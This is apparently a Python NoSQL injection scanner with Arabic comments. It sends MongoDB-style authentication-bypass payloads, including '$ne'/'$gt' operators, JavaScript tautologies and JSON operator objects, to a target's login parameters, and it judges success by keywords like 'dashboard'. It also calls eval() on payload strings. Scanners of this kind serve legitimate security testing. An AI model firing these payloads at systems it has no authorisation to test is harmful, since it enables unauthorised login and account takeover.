"""
NoSQL Injection Scanner
يفحص: MongoDB, CouchDB, Redis
"""

import requests
import urllib.parse
from typing import List, Dict

class NoSQLInjectionScanner:
    
    def __init__(self, target: str):
        self.target = target
        self.vulnerabilities = []
        
        # Payloads
        self.payloads = [
            "' || '1'=='1",
            "[$ne]",
            "[$gt]",
            "'; return true; var foo='",
            "admin' && this.password.match(/.*/)//+%00",
            "' || 1==1//",
            "' || 1==1%00",
        ]
        
        self.json_payloads = [
            '{"username": {"$ne": null}, "password": {"$ne": null}}',
            '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
            '{"username": "admin", "password": {"$ne": ""}}',
        ]
    
    def scan(self) -> List[Dict]:
        """الفحص الرئيسي"""
        print(f"[+] فحص NoSQL Injection: {self.target}")
        
        self._test_nosql_payloads()
        self._test_json_payloads()
        
        return self.vulnerabilities
    
    def _test_nosql_payloads(self):
        """اختبار NoSQL payloads"""
        for payload in self.payloads:
            try:
                url = f"{self.target}?username={urllib.parse.quote(payload)}&password=test"
                response = requests.get(url, timeout=10)
                
                if self._check_success(response):
                    self.vulnerabilities.append({
                        'type': 'NoSQL Injection',
                        'severity': 'critical',
                        'url': url,
                        'payload': payload,
                        'evidence': response.text[:200]
                    })
                    print(f"  [!] NoSQL Injection وُجدت! Payload: {payload}")
                    return
            except:
                pass
    
    def _test_json_payloads(self):
        """اختبار JSON payloads"""
        for payload in self.json_payloads:
            try:
                response = requests.post(
                    self.target,
                    json=eval(payload),
                    timeout=10
                )
                
                if self._check_success(response):
                    self.vulnerabilities.append({
                        'type': 'NoSQL Injection (JSON)',
                        'severity': 'critical',
                        'url': self.target,
                        'payload': payload
                    })
                    print(f"  [!] NoSQL Injection (JSON) وُجدت!")
                    return
            except:
                pass
    
    def _check_success(self, response) -> bool:
        """فحص نجاح الاختراق"""
        success_indicators = [
            'welcome',
            'dashboard',
            'logout',
            'profile',
            'authentication successful',
            'login successful'
        ]
        
        text = response.text.lower()
        return any(indicator in text for indicator in success_indicators)
